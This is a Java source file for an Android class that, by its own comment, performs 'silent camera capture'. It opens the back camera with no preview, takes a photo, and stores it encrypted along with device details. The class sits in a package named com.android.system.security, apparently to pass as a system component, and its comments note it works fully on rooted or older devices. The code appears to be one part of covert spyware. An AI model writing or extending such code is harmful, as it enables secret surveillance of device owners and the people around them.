package com.android.system.security;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import java.io.*;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.*;

/**
 * Silent camera capture via Camera2 API.
 *
 * On Android 14+ (API 34+), background camera is RESTRICTED:
 * - Requires FOREGROUND_SERVICE_CAMERA permission
 * - Service must be started while app is in foreground
 * - CAMERA runtime permission required
 *
 * If restricted, gracefully fails and logs it.
 * On older Android or rooted devices, works fully.
 */
public class CameraCapture {

    private static final String TAG = "CameraCapture";

    private final Context context;
    private final EncryptedStore encryptedStore;
    private final ProgressTracker progressTracker;

    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraManager cameraManager;
    private String cameraId;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private boolean initialized = false;

    // Capture state
    private final CountDownLatch captureLatch = new CountDownLatch(1);
    private byte[] lastCapturedImage;

    public CameraCapture(Context context, EncryptedStore encryptedStore, ProgressTracker progressTracker) {
        this.context = context;
        this.encryptedStore = encryptedStore;
        this.progressTracker = progressTracker;
    }

    /**
     * Initialize camera system. Must be called before capture().
     * Attempts to open the back camera briefly to test access.
     * If it fails (permission denied, background restriction), logs and moves on.
     */
    public boolean init() {
        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "camera_init");

        try {
            cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager == null) {
                return check.fail("Camera service not available");
            }

            // Check camera permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                    android.support.v4.content.ContextCompat.checkSelfPermission(context,
                        android.Manifest.permission.CAMERA)) {
                    return check.fail("CAMERA permission not granted");
                }
            }

            // Find back camera
            String[] cameraIdList = cameraManager.getCameraIdList();
            if (cameraIdList == null || cameraIdList.length == 0) {
                return check.fail("No cameras available");
            }

            // Prefer back camera (usually id 0)
            cameraId = cameraIdList[0];
            for (String id : cameraIdList) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }

            // Check if camera is accessible (test open)
            try {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
                StreamConfigurationMap configs = chars.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (configs == null) {
                    return check.fail("No stream configs for camera");
                }

                // Get output sizes for JPEG
                Size[] jpegSizes = configs.getOutputSizes(ImageFormat.JPEG);
                if (jpegSizes == null || jpegSizes.length == 0) {
                    return check.fail("No JPEG output sizes");
                }

                // Start camera thread
                cameraThread = new HandlerThread("CameraWorker");
                cameraThread.start();
                cameraHandler = new Handler(cameraThread.getLooper());

                initialized = true;
                return check.ok("Camera initialized: " + cameraId +
                    " (sizes: " + jpegSizes.length + ")");

            } catch (CameraAccessException e) {
                return check.fail("Camera access denied: " + e.getMessage());
            }

        } catch (SecurityException e) {
            return check.fail("Camera permission denied: " + e.getMessage());
        } catch (Exception e) {
            return check.fail("Camera init failed: " + e.getMessage());
        }
    }

    /**
     * Capture a single photo. Returns true if successful.
     * Blocking call (up to 5 seconds timeout).
     */
    public boolean capture() {
        if (!initialized) {
            progressTracker.record("camera_capture", false, "Not initialized");
            return false;
        }

        ProgressTracker.Check check = new ProgressTracker.Check(progressTracker, "camera_capture");

        try {
            // Open camera
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    try {
                        startCaptureSession();
                    } catch (Exception e) {
                        Log.w(TAG, "Capture session start failed: " + e.getMessage());
                        captureLatch.countDown();
                    }
                }

                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.w(TAG, "Camera disconnected");
                    device.close();
                    captureLatch.countDown();
                }

                @Override
                public void onError(CameraDevice device, int error) {
                    Log.w(TAG, "Camera error: " + error);
                    device.close();
                    captureLatch.countDown();
                }
            }, cameraHandler);

            // Wait for capture to complete (5 second timeout)
            boolean completed = captureLatch.await(5000, TimeUnit.MILLISECONDS);

            if (completed && lastCapturedImage != null) {
                // Store encrypted
                storeImage(lastCapturedImage);
                return check.ok("Photo captured: " + lastCapturedImage.length + " bytes");
            } else {
                return check.fail(completed ? "No image data" : "Capture timeout");
            }

        } catch (SecurityException e) {
            return check.fail("Camera security exception (likely background restriction): " + e.getMessage());
        } catch (CameraAccessException e) {
            return check.fail("Camera access exception: " + e.getMessage());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return check.fail("Capture interrupted");
        } catch (Exception e) {
            return check.fail("Capture error: " + e.getMessage());
        }
    }

    private void startCaptureSession() throws CameraAccessException {
        if (cameraDevice == null) return;

        // Get optimal JPEG size
        CameraCharacteristics chars = cameraManager.getCameraCharacteristics(cameraId);
        StreamConfigurationMap configs = chars.get(
            CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
        Size[] jpegSizes = configs.getOutputSizes(ImageFormat.JPEG);

        Size captureSize = jpegSizes[0];
        // Pick a reasonable size (not max, for speed)
        for (Size s : jpegSizes) {
            if (s.getWidth() <= 1920 && s.getHeight() <= 1080) {
                captureSize = s;
                break;
            }
        }

        // Create ImageReader for JPEG capture
        imageReader = ImageReader.newInstance(
            captureSize.getWidth(), captureSize.getHeight(),
            ImageFormat.JPEG, 1);
        imageReader.setOnImageAvailableListener(reader -> {
            try (Image image = reader.acquireLatestImage()) {
                if (image != null) {
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    lastCapturedImage = new byte[buffer.remaining()];
                    buffer.get(lastCapturedImage);
                }
            } catch (Exception e) {
                Log.w(TAG, "Image read error: " + e.getMessage());
            } finally {
                captureLatch.countDown();
            }
        }, cameraHandler);

        // Create capture session
        List<Surface> surfaces = Collections.singletonList(imageReader.getSurface());
        cameraDevice.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
            @Override
            public void onConfigured(CameraCaptureSession session) {
                try {
                    CaptureRequest.Builder requestBuilder =
                        cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                    requestBuilder.addTarget(imageReader.getSurface());

                    // Auto-focus if available
                    requestBuilder.set(CaptureRequest.CONTROL_AF_MODE,
                        CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);

                    // Auto-exposure
                    requestBuilder.set(CaptureRequest.CONTROL_AE_MODE,
                        CaptureRequest.CONTROL_AE_MODE_ON);

                    // Orientation
                    requestBuilder.set(CaptureRequest.JPEG_ORIENTATION, 0);

                    session.capture(requestBuilder.build(), null, cameraHandler);

                } catch (Exception e) {
                    Log.w(TAG, "Capture request failed: " + e.getMessage());
                    captureLatch.countDown();
                }
            }

            @Override
            public void onConfigureFailed(CameraCaptureSession session) {
                Log.w(TAG, "Session configure failed");
                captureLatch.countDown();
            }
        }, cameraHandler);
    }

    private void storeImage(byte[] imageData) {
        try {
            Map<String, Object> entry = new HashMap<>();
            entry.put("type", "camera_photo");
            entry.put("timestamp", System.currentTimeMillis());
            entry.put("size", imageData.length);
            entry.put("camera_id", cameraId);
            entry.put("device", android.os.Build.MODEL);
            entry.put("api_level", android.os.Build.VERSION.SDK_INT);
            entry.put("image_data", imageData);  // Will be encrypted by EncryptedStore

            encryptedStore.store("camera", entry);
            Log.i(TAG, "Photo stored: " + imageData.length + " bytes");

        } catch (Exception e) {
            Log.w(TAG, "Photo storage failed: " + e.getMessage());
        }
    }

    /**
     * Clean up camera resources.
     */
    public void shutdown() {
        try {
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (cameraThread != null) {
                cameraThread.quitSafely();
                cameraThread = null;
            }
            initialized = false;
        } catch (Exception e) {
            Log.w(TAG, "Shutdown error: " + e.getMessage());
        }
    }

    public boolean isInitialized() { return initialized; }
  }
